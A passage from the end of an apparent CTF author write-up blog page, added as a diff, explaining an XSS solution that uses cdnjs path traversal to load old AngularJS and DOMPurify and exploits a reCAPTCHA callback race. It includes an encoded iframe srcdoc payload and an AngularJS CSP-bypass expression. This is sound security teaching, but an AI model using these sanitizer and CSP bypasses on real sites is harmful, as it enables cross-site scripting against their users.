punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x75<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6d<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x65<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x64<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6d<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x29<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x7d<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x7d<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x64<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x76<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3e<span class="token punctuation">;</span>
+'<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The content of <code>srcdoc</code> is the classic angularJS CSP bypass payload we mentioned</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/dompurify/..%2fprototype/1.7.2/prototype.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/dompurify/..%2fangular.js/1.0.1/angular.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-app</span> <span class="token attr-name">ng-csp</span><span class="token punctuation">></span></span>｛&#123;$on.curry.call().alert($on.curry.call().document.domain)&#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>The flow is like:</p>
+<ol>
+<li>reCAPTCHA triggers <code>reloadRecaptchaScript()</code>, will be run after 1s</li>
+<li>reCAPTCHA triggers <code>reloadRecaptchaScript()</code>, will be run after 1s</li>
+<li>reCAPTCHA triggers <code>loadData()</code>, run immediately and pollute <code>document.scripts[&#39;undefined&#39;]</code></li>
+<li>Run the function in step 1, load src from <code>&lt;input&gt;</code>, call <code>loadScript(&#39;https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.0/purify.min.js&#39;)</code></li>
+<li>Run the function in step 2, load src from <code>&lt;img&gt;</code>, call <code>loadScript(&#39;https://www.google.com/recaptcha/../jsapi?callback=loadData&#39;)</code> to trigger <code>loadData</code> again</li>
+<li>Old version of DOMPurify has loaded (the lib we load in step 4), override latest one</li>
+<li>Script at step 5 also loaded, <code>loadData</code> has been called again</li>
+<li>Now, the DOMPurify is the old and flawed version, so we can bypass it easily</li>
+</ol>
+<p>It sometimes fails because of race conditions.</p>
+<p>For example, if script at step 5 is loaded(called <code>loadDate</code>) before DOMPurify, we still use the latest version, so there is no way to bypass it.</p>
+<p>The author created an HTML page and embedded a few <code>&lt;iframe&gt;</code> to load the URL many times to solve the issue. </p>
+<h2><span id="takeaways">Takeaways</span></h2><ol>
+<li>Everything can be abuse</li>
+<li>Existing JS code might be helpful sometimes</li>
+<li>Knowing the default behavior of third party libraries is helpful</li>
+</ol>
+<p>I hope you did learn something new and enjoyed this challenge, thanks for playing the game!</p>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2022/04/14/en/javascript-string-regexp-magic/">The Magical Features of RegExp and String Replacement in JavaScript</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2022/04/10/en/picoctf-2022-writeup/">picoCTF 2022 Notes</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">Comments</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2023 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>English</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2022/04/13/notes-challenge-author-writeup/" class="dropdown-item">
+                    繁體中文
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
